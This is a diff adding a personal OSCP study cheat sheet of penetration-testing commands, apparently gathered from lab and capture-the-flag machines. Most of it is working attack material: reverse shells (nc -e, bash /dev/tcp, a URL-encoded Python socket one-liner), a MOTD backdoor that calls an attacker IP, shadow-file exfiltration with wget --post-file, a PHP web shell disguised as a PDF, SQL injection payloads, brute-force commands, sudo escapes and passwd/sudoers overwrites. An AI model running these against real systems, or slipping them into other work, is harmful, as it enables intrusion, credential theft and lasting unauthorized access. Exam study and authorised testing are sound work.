@@ -1,0 +1,825 @@
+PERSONAL OSCP NOTES
+==-==-==-==-==-==-==
+OSCP | GPEN | eCPTX | CREST CRT | eCPPTv2 | GWAPT | ECSA (Practical) | CREST CPSA | ACE
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--==-=-= 
+self_awareness, happiness, workethic
+Reconnaissance
+---------------
+
+Skip Tracing Framework
+	http://makensi.es/stf/
+
+www.traceroute.org
+www.kloth.net/services/traceroute.php
+www.tracert.com
+
+Red teaming roadmap
+CRTP > Offshore > Red Team Ops zeropointsecurity.co.uk > Rastalab > CRTE
+
+Cyberchef --> website that allows decoding and encoding of various stuffs like ssh(RSA,cipher),jpg etc
+
+
+
+nmap -A -p- -T4 192.168.6.145
+nmap -sV 192.168.20.10-12 -oA bookversionnmap
+nmap -sS -T4 -A [IP]
+nmap -sS -sC -sV -Pn -T4 -vv 192.168.6.137
+
+(-A = -O + -sV + -sC + --traceroute)
+
+Stealth Scan -sS
+Script SCan  -sC
+Version Scan -sV
+Ping Scan    -sn
+TCP Scan     -sT
+UDP Scan     -sU       
+FIN Scan     -sF        
+(-sF Finished Scan)- Used to send finished message to server so firewall would think
+ you are already talking with the server and allows you in to finish your talking)
+
+Always Use Autorecon.py :)
+
+================
+HTTP enumeration
+================ 
+go to website and view source code
+ 
+Check for /robots.txt
+
+using dirbuster
+dirb http://192.168.6.139
+dirb http://192.168.6.139 -X .php
+dirb http://192.168.6.139 -X .txt
+dirb http://192.168.6.139 -X .html
+
+or gobuster 
+
+then nikto -h 192.168.6.141
+     nikto -host=http://www.megacorpone.com -maxtime=30s
+		- Nikto v2.1.6
+		---------------------------------------------------------------------------
+		+ Target IP: 38.100.193.76
+		+ Target Hostname: www.megacorpone.com
+		+ Target Port: 80
+		---------------------------------------------------------------------------
+
+SPARTA and autorecon.py are recon automators.
+---------------------
+Exploiting PUT method
+---------------------
+Curl, Cadaver, nmap, Poster(firefox-addon), Burpsuit, Metasploit....
+all of these can be used to upload reverse_shell on to the victim machine.
+
+Curl is Command line tool 
+	curl http://192.168.6.103/dav/ --upload-file /root/Desktop/shell.php -v
+
+Cadaver is a tool pre-installed in kali that enables uploading & downloading of a file on WebDAV.
+	ON KALI
+		cadaver http://victim_ip/
+		put /root/Desktop/Rev_shell.php
+
+Nmap can also upload malcious file to the remote server	
+	nmap -p 80 192.168.6.103 --script http-put --script-args http-put.url='/dav/shell.php' ,http-put.file='/root/Desktop/shell.php
+
+Poster is a firefox addon for interacting with web services which can be used to trigger HTTP request parameters like
+GET,POST,PUT and DELETE.
+
+	Install the Poster add-on in firefox
+	From there it is GUI-based :P
+	
+Burpsuit is proxy-interception tool, and using it to send PUT request is also easy
+	Turn intercept on
+	and add "PUT /dav/rev_shell.php HTTP/1.1" in the header and then paste the malicious code within the request but as the body
+	
+Metasploit has built-in aux module to PUT file
+	msf> use auxiliary/scanner/http/http_put
+	msf>auxiliary (http_put) > set rhosts 192.168.6.103
+	msf>auxiliary (http_put) > set payload php/meterpreter/reverse_tcp
+	msf>auxiliary (http_put) > set path /dav/
+	msf>auxiliary (http_put) > set filename shell.php
+	msf>auxiliary (http_put) > set filedata file://root/Desktop/meter.php
+	msf>auxiliary (http_put) > exploit
+	
+===============
+base 64 stuffs
+===============
+base64 kunal.txt        (It will encode the contents of file)
+base64 -d kunal.txt
+
+echo -n asasasasassadasdasdasdas= | base64 -d
+
+echo -n asasasasassadasdasdasdas= | base64 -d | wc -c (WORD COUNT FOR asasasasassadasdasdasdas=)
+	25
+
+
+==============
+DNS Resolution 
+==============
+nslookup  www.google.com
+
+dig axfr @192.168.6.136 kioprio.com
+dig axfr @192.168.6.136 kioprio.com > zonetransfer  (For saving the output into zonetransfer file)
+
+dig axfr @192.168.6.136 kioprio2.com
+dig axfr @192.168.6.136 kioprio2.com >> zonetransfer (For appending/updating the same file we use double >> )
+
+dig @10.10.176.179 bookface.com -t TXT
+	to find flag2 with TXT header 
+	
+==========================================
+Automating websites checking from dns res
+========================================== 
+
+create a file named websites and enter 
+	http://kio1.com
+	http://b1.kio2.com
+	http://kio3.admin.com
+	http://administrator.kio1.com
+
+now to check all of those websites at once automatically unless doing it manually type
+
+cat websites | aquatone
+
+And aquatone would go to all websites and would screenshot them, so we get to know which are real and which are fake websites.
+
+=====================
+Find running Services
+=====================
+netstat -plnt
+
+======================================================
+SMB & NFS {Server Message Block & Network File System}
+======================================================
+SMB & NFS are client-server communication protocols used for sharing access to files, printers, serial ports and other resources on a network.
+
+Samba is used for sharing linux file to windows network.
+Nfs is used to share all the file system on network.
+
+Windows does not support NFS. So if there is atleast one windows machine in a network then samba must be used for file transfers between linux & windows.
+If all are unix machines in a network then NFS must be used. It shares filesystem between unix platform alone.
+Samba is an open-source implementation of the System Message Block (SMB) service used by Microsoft Windows 9xand NT, which is sometimes known as Common Internet File System (CIFS)
+
+NFS (Network file system) is a file sharing protocol which is native to Unix/Linux systems.
+Samba is a piece software which adds SMB/CIFS filesharing protocol to Linux/Unix. 
+CIFS (Common internet file sharing) is filesharing protocol which is native to windows.
+
+In short
+NFS is used------> Only Linux systems in a server
+SMB is used------> Linux and WIndows both in server
+
+===================== 
+SMB(Samba) enumeration
+===================== 
+Samba is contained in three packages:
+*)samba-common, which contains files needed by Samba clients and servers
+*)samba, which contains the Samba server
+*)samba-client, which contains the Sambasmbclient,smbmount,and smbprint programs and associated files and documentation
+
+smbmap is used to list out open directories and it's permissions
+smbclient is used to connect to those open directories 
+
+smbmap -H 192.168.6.136
+smbmap -H 192.168.6.136 -R --depth 5 ( -R Recursively list directories, --depth 5 Traverse a directory tree to a specific depth)
+smbmap -H 192.168.6.135 -u admin -p password
+
+smbclient //192.168.6.136
+smbclient //192.168.6.136/(directory/disk_name)
+	> get s33cret.txt
+	> exit
+cat s33cret.txt
+
+smbclient -L //192.168.6.136 ({-L} And it will list directories with comments)
+
+smbclient --no-pass //10.10.10.178/Data 
+
+smbclient -U admin //192.168.6.136/(directory/disk_name)
+	Enter admin's password: admin123
+	> put reverse_shell.php
+	> exit
+
+
+To save everythig from smb share to KALI	
+smb: \> recurse on
+smb: \> prompt off
+smb: \> mget *
+
+
+==========================================
+NFS (Network File System) open mount vuln (port 111)
+==========================================
+showmount -e 192.168.6.154
+or
+showmount --exports 192.168.6.146
+	Export list for 192.168.6.146:
+	/home/shivay *
+	
+as we can see vulnerable NFS /home/shivay can be mounted to our kali machine
+First make a folder in which to mount the /home/shivay
+In kali
+mkdir /tmp/shivaytmp
+mount -t nfs 192.168.6.146:/home/shivay /tmp/shivaytmp  (where -t means type)
+
+And now we can copy our reverse_shell to mounted nfs
+Copy reverse_shell.php to /tmp/shivaynfs
+
+Now access reverse_shell 
+http://192.168.6.146/nandi.php?file=/home/shivay/reverse.php
+
+What ever we upload into mounted NFS, it get's uploaded into actual NFS
+
+
+
+=============================================
+Download files within meterpreter/reverse_tcp
+==============================================
+
+Sometimes there comes times where you are in msfconsole's meterpreter/reverse_tcp shell and you need
+to download files from victim machine to kali
+
+	meterpreter > download \openssh.gzip /root/Desktop/
+
+
+=================
+SNMP Enumeration
+=================
+snmp is common in windows machines
+
+snmpwalk -c public -v2c 10.10.10.116
+
+snmp-check 10.10.10.116
+
+
+==========
+ssh
+==========
+Login to ssh
+ssh root@10.10.10.16
+
+Login to ssh via private key
+ssh -i isakey.key user@10.10.10.146
+ (Also it might ask for passphrase, use ssh2john and crack it) 
+ to copy isa_key from user (You need access to user :p)
+	copy from /home/root/.ssh/isa.key (But for that we first need the access to victim to steal the private key :)
+	
+Bruteforcing the ssh
+	hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.6.151 ssh -t 4
+		-l is the user name 
+		-P is the word file
+		
+Copying Files from ssh shell
+Suppose there is a file inside victim machine name user.jpg which u need to copy to kali via ssh then use
+
+	scp -i id_rsa willow@10.10.154.10:user.jpg flag.jpg	
+
+It saves user.jpg from victim machine to flag.jpg in kali
+		
+===
+FTP
+===
+Bruteforce FTP with user jerry
+hydra -l jerry -P /usr/share/wordlists/rockyou.txt 10.10.176.179 ftp
+
+
+=========================
+Creating Salted Password
+=========================
+There may be times where /etc/passwd file is editable
+And you may wanna add your own root user with password 
+So here is how to generate a password
+
+openssl passwd -1 -salt kunal patel
+
+And it will create a user name kunal with password patel
+
+kunal:$xxxxxxxxxxxxxxxxxxx:0:0:root:/root:/bin/bash                   (where xxxxx is encrypted password)
+
+=============
+SQL INJECTION
+=============
+ User Login & password:   
+         
+		'
+		' or '1'='1
+		%' or '0'='0
+		
+
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+
+' UNION SELECT 'a',NULL,NULL,NULL--
+' UNION SELECT NULL,'a',NULL,NULL--
+' UNION SELECT NULL,NULL,'a',NULL--
+' UNION SELECT NULL,NULL,NULL,'a'-- 
+
+' UNION SELECT username, password FROM users-- 
+'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
+
+'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
+
+=============
+REVERSE SHELL
+============= 
+attacker(host)          nc -nvlp 4444
+
+http://kioptrix3.com/index.php?page=index%27);${system(%27nc%20-e%20/bin/sh%20192.168.6.134%204444%27)};%23
+
+
+if found PING SEARCHBOX in website then use below command to get reverse shell
+	; bash -i >& /dev/tcp/192.168.6.148/4444 0>&1
+ 
+
+====================
+LOCAL FILE INCLUSION
+==================== 
+
+Basic file inclusion: xxx.php?language=/etc/passwd             (../) or simply (/)
+Null byte inclusion: xxx.php?language=/etc/passwd%00           (%00) or (%00jpg)
+Base64 encoded inclusion: xxx.php?language=php://filter/read=convert.base64-encoded/resource=/etc/passwd
+					      http://192.168.6.147/?page=php://filter/convert.base64-encode/resource=config
+
+replace language by page,system,file,input,etc
+
+
+TO ENUMERATE USERNAMES (..search for /home/xxx :/usr/bin   where xxx is username in passwd file) 
+
+http://192.168.x.x/index.php?system=../../../../../../etc/passwd%00jpg
+http://192.168.x.x/index.php?system=../../../../../../etc/passwd
+http://192.168.x.x/connect.php?file=../../../../../../etc/passwd
+http://192.168.x.x/connect.php?file=/etc/passwd
+http://192.168.6.146/nandi.php?file=/home/shivay/reverse.php
+
+http://192.168.6.147/?page=php://filter/convert.base64-encode/resource=index
+http://192.168.6.147/?page=php://filter/convert.base64-encode/resource=config
+http://192.168.6.147/?page=php://filter/convert.base64-encode/resource=upload
+
+
+PHP wrapper
+-----------
+We can use the data280 wrapper to embed inline data as part of the URL with plaintext or base64281
+encoded data. This wrapper provides us with an alternative payload when we cannot poison a local
+file with PHP code. (can also gain a shell {RFI} using wrapper)
+
+		/menu.php?file=data:text/plain,hello world
+		/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
+		
+		
+Upoad a fake file
+------------------
+If server allows only pdf files to be uploaded use %PDF header like:
+
+	%PDF-1.4
+	<?php	
+		system($_GET["cmd"]);
+	?>
+and save it as shell.pdf 
+http://192.168.6.136/index.php?page=uploads/shell.pdf%00&cmd=whoami
+
+
+If server allows only .jpg files to be uploaded insert reverse shell into metadata of an image
+
+	Upload any image file with xx.php.jpg/xx.jpg.php extension.
+	Fire up burpsuit and change file type to image/php (This step Not necessary )
+	And using burpsuit remove middle contents of image and add reverse shell php contents.
+	Also check param tab in burpsuit to make sure it's not leaking reverse shell contents.
+
+
+Upload a reverse_shell file into vuln server 
+ and connect to it
+ For eg:
+ http://192.168.x.x/connect.php?file=/uploads/reverse.php
+
+
+
+
+=====================
+REMOTE FILE INCLUSION
+===================== 
+Always upload echo file first on remote system to make sure it works 
+<?php
+echo("Hello kunal");
+?>
+save it as test.php, upload it
+http://192.168.6.138/connect.php?file=http://192.168.6.141/test.php
+
+
+And if it works then use reverse shell php
+http://192.168.x.x/connect.php?file=http://192.168.6.141/reverse.php
+
+One liner reverse shell (URL encoded reverse shell)
+http://kioptrix3.com/index.php?page=index%27);${system(%27nc%20-e%20/bin/sh%20192.168.6.141%204444%27)};%23
+
+Now to create 
+Reverse Shell payload using msfvenom 
+
+msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.6.146 LPORT=4444 >> exploit.php
+
+
+now open msfconsole to set a listener like netcat for our msfvenom payload
+
+msfconsole
+use exploit/multi/handler
+set LHOST [kali_ip]
+set LPORT [4444]
+set payload php/meterpreter/reverse_tcp
+exploit
+
+=====
+zico2
+=====
+python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.6.154%22,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27
+
+
+========================
+ISRO mahine walkthrough
+========================
+http://192.168.6.139/connect.php?file=http://192.168.6.141/reverse.php
+vi /etc/passwd
+su root
+mysql -u root
+show databases;
+use flag;
+show tables;
+select * from flag;
+
+=================
+Windows 7 SP1 x64
+=================
+=============
+Eternal blue
+=============
+nmap -p 445 --script "vuln and safe" -Pn -n 10.10.10.178
+metasploit 
+use windows/smb/ms17_010_eternalblue)
+
+use post/multi/manage/shell_to_meterpreter
+	meterpreter> getsystem
+	meterpreter> ps
+	meterpreter> migrate {PID}    (Usually powershell or cmd should work but any NT Authority will work)
+	meterpreter> hashdump
+	Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+    Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+	
+Copy these hashdumps in hash file and use john to crack it
+
+john hash --format=NT --wordlist=/usr/share/wordlists/rockyou.txt 
+
+
+===========================
+Cracking .zip .7z .rar fles
+===========================
+In order to crack these password protected files. 
+Firstly we need to find out it's password hash from the compressed file. 
+Use github scripts like rar2john to extract the hash and then crack it using john 
+
+
+zip2john  encrypted.zip < encrypted.hash$
+rar2john  encrypted.rar < encrypted.hash$
+7z2john   encrypted.7z < encrypted.hash$
+
+then use
+john --wordlist=/usr..../rockyou.txt encrypted.hash$
+john --show encrypted.hash$
+
+OR
+
+FCrackZip by Marc Lehmann is also a free and fast zip and 7-zip password cracker.
+sudo apt-get install fcrackzip
+RarCrack by David Zoltan Kedves is a simple bruteforce zip,7-zip and rar password cracker.
+sudo apt-get install rarcrack
+
+hashes.org
+crackstation.net
+
+====================
+WORDPRESS BRUTEFORCE
+====================
+hydra -l kunal -P /usr/share/wordlists/rockyou.txt 10.10.10.x http-post-form "/wp-login.php:log=kunal&pwd=^PASS^:ERROR
+
+wpscan --url http://192.168.0.18 --wordlist=/root/Downloads/fsocity.dic --username elliot
+
+wpscan --url http://192.168.6.145 -P /root/Downloads/fsocity.dic -U elliot
+
+============
+mysql (3306)
+============
+to access mysql remotely ->
+mysql -u root -h 192.168.6.147 --password=H4u%QJ_H99
+OR
+mysql --user=root --password=toor --host=192.168.6.147
+
+or locally ->
+mysql -u root
+OR
+mysql -u root -p toor
+OR
+mysql -u root -p
+	Enter password:
+
+show databases;      <-------It just lists all databases installed
+use flag;       <------Selects the database named flag
+show tables;         <---------Shows all the tables inside that flag database
+select * from key;   <----------- Shows everything from that key table
+
+
+================
+priv escalation
+================
+	Via kernel exploits
+	Exploiting services which are running as a root
+	Exploiting SUID Executables
+	Exploiting SUDO rights/user
+	Exploiting badly configured cron jobs
+	Exploiting users with '.' in their PATH
+	
+	
+	
+netstat -antp   (Shows which ports/ip machine is listening to)
+
+ps -aux | grep root
+
+ls -la on etc/passwd or etc/shadow
+
+uname -a (to get full kernel version)
+
+sudo -l (shows what current user can execute as root)
+
+Distribution information is in
+	- etc/release
+	- etc/issue*
+	
+Run ltrace command against any setuid and setgid programs found
+Look for setuid programs with:
+	find directory -user root -perm -4000 -exec Ls -ld {} \; >/tmp/gaping-security-hole
+	
+Weak permissions on LD_PRELOAD (LINUX) DLL_SIDELOAD(WINDOWS)
+
+TO FIND EXECUTABLES WHICH HAVE SUID BIT SET USE
+	find / -perm -u=s -type f 2>/dev/null
+
+FIND CRON TABS
+linpeas.sh
+linuxprivchecker.py     linPrivchecker.sh     Linexploitchecker.sh
+
+Also use "pspy github" to check every running process on machine every sec (usefull for finding cron processes)
+
+-------------
+MOTD Priv esc
+-------------
+While logging into an ssh if MOTD(Message Of The Day) found (Header)
+
+
+Go to /etc/update-motd.d/ and type following
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.66 420 >/tmp/f" >> 00-header 
+
+Now wait on nc -nvlp 420
+
+--------------------
+Gaining root via zip
+--------------------
+If sudo -l shows user can execute zip as a root
+
+use 
+
+sudo zip /tmp/kunal.zip /tmp/ -T --unzip-command="sh -c /bin/bash"
+
+
+and you are root
+
+-------------------------------
+Sudo -l (find,python,cat,mysql)
+-------------------------------
+sudo find /home -exec sh -i \;
+sudo python -c 'import pty;pty.spawn("/bin/bash");'
+sudo cat /etc/shadow (:P and use john to crack password)
+sudo mysql -e '\! /bin/sh'
+
+------------------------------------------------------------------------------
+Sudo -l (ftp,expect,env,ed,perl,socat,less,man,git,pico,scp,ssh,curl,vi,rvim,)
+------------------------------------------------------------------------------
+FTP
+	sudo ftp
+	!/bin/bash
+	id
+EXPECT
+	sudo expect -i
+ENV
+	sudo env /bin/bash
+ED
+	sudo ed
+	!/bin/bash
+PERL
+	sudo perl -e 'exec "/bin/bash";'
+SOCAT
+	ON VICTIM
+	sudo socat exec: sh -li' ,pty,stderr,setsid,sigint,sane tcp:kali_ip:1234
+	ON KALI
+	socat file:'tty' ,raw,echo=0 tcp-listen:1234
+LESS
+	sudo less /etc/hosts (It opens file in VI mode, so executing !bash command inside it would get root shell)
+	!bash
+MAN
+	sudo man /etc/hosts (again It opens file in VI mode, so executing !bash command inside it would get root shell)
+	!bash
+GIT
+	sudo git help status
+	!bash
+PICO
+	Pico is the text editor same as nano and vi, so additionally u can also edit the /etc/passwd to add new root user
+SCP
+	It can be used to break out from restricted environments
+		
+		hack=$(mktemp)
+		echo "/bin/bash 0<&2 1>&2"> $hack
+		chmod +x "$hack"
+		sudo scp -S $hack abc abd;
+		id
+SSH
+	sudo ssh -o ProxyCommand=";/bin/bash 0<&2 1>&2" abc
+	id
+CURL
+	sudo curl http://kali_ip/root/Desktop/passwd -o /etc/passwd
+	sudo -u kunal bash
+VI EDITOR
+	sudo vi
+	:!sh
+	id
+RVIM
+	sudo rvim -c ":py3 import pty; pty.spawn('/bin/bash')"
+	!bash
+	id
+	
+-------------
+root via vim
+-------------
+
+	:set shell=/bin/bash
+	:shell
+	
+---------------------
+Gaining root via wget
+---------------------
+
+	REPLACING PASSWD FILE IN VICTIM
+	---=---=---=---=---=---=---=---=
+		Create a password hash and add it inside passwd file.
+		Now use wget in victim as root to replace the original passwd file with ours.
+		
+			ON KALI
+			openssl passwd -1 -salt kunal patel
+			python -m SimpleHTTPServer
+			
+			ON VICTIM
+			cd /etc
+			wget -O passwd http://kali_ip:8000/passwd
+			
+			su kunal
+			password: patel
+			whoami
+			#root
+			
+	EDITING SUDOERS FILE TO GET ROOT
+	---=---=---=---=---=---=---=---=
+		ON VICTIM
+			echo "kunal ALL=(ALL) NOPASSWD: ALL" > /tmp/sudoers
+			cd /tmp
+			python -m SimpleHTTPServer 8080	
+			sudo wget 0.0.0.0:8080/tmp/sudoers -O /etc/sudoers		
+			Now just run sudo /bin/bash
+		
+	\\OR//
+		
+		ON KALI
+			echo "kunal ALL=(ALL) NOPASSWD: ALL" > /tmp/sudoers
+			cd /tmp
+			python -m SimpleHTTPServer 8080
+			
+		ON VICTIM
+			wget kali_ip:8080/tmp/sudoers -O /etc/sudoers
+		
+		Now just run sudo /bin/bash
+
+	STEALING SHADOW FILE FROM THE VICTIM
+	---=---=---=---=---=---=---=---=---
+	Set	 nc listening server on kali	
+			nc -nvlp 80 > shadowhash
+
+		Now in victim machine use
+			sudo /user/bin/wget --post-file=/etc/shadow 192.168.x.x(kali_ip)
+
+		and we would get the shadow file of the victim into our kali machine, just use john to crack it (john shadowhash)
+
+---------------------
+Gaining root via nmap
+---------------------
+
+If nmap is installed in machine
+use
+	nmap --interactive
+	!sh
+and you are root
+	
+Unfortunately it didn't worked at my college pc so i used
+
+	echo "os.execute('/bin/sh')" > /tmp/root.nse
+	sudo nmap --script=/tmp/root.nse
+	
+And got root. You can also make a .sh file for it and run via "nmaproot.sh"
+
+
+-------------------------
+CVE-2019-14287 Sudo vuln 
+-------------------------
+This vulnerability occurs when sysadmin inserts an entry into the sudoers file
+For eg: 
+		mahakal myhost = (ALL, !root) usr/bin/watch
+
+To get priv esc:
+	sudo -l
+	[sudo] password for mahakaal: 
+	Matching Defaults entries for mahakaal on ubuntu:
+		env_reset, mail_badpass,
+		secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+	User mahakaal may run the following commands on ubuntu:
+		(ALL, !root) /usr/bin/watch
+		^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+	if this found type 
+
+	sudo -u#-1 watch -x sh -c 'reset; exec sh 1>&0 2>&0' -u
+
+AND YOU ARE ROOT (just replace "watch" with appropriate name)
+
+===============
+port forwarding
+===============
+
+On victim if mysql is runnning on 127.0.0.1:3306 and u want to run it on kali then use ssh
+
+On victim
+	ssh -R 4444:127.0.0.1:3306 root@192.168.{KALI_IP}
+On kali
+	mysql -u root -h 127.0.0.1 -P 4444
+
+====
+GREP
+====
+Grep command is usefull to find a string from many files
+
+Suppose from many file to find IP ADDRESS use
+	grep -rn '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'
+	
+To find keyword 'password' from multiple files
+	grep -nr 'password'
+
+To list only users from passwd file
+	cat /etc/passwd | grep /bin/bash
+
+=======
+Strings
+=======
+
+strings *.sdf | more
+
+========================
+Python Interactive shell
+========================
+Once you get reverse shell, if dont wanna accidentally kill it with ctrl+c
+
+
+python -c "import pty; pty.spawn('/bin/bash')"
+python3 -c "import pty; pty.spawn('/bin/bash')"
+ctrl+z
+stty raw -echo
+fg
+export TERM=xterm
+
+====
+curl
+====
+
+curl -d "username=jimmy&password=n1nj4W4rri0R!" -X POST http://localhost:52846/main.php
+	Sends POST data with creds	
+
+===============
+TRANSFER FILES
+===============
+sudo apt-get install apache2
+service apache2 start
+cp xxx /var/www/html
+wget http://host/xxx
+curl -d http://a/a
+gcc xxx -o exploit
+chmod 777 exploit
+./exploit
+whoami
+
+OR
+to create a server on current directory
+
+python -m SimpleHTTPServer 800
+	Serving HTTP on 0.0.0.0 port 800 ...
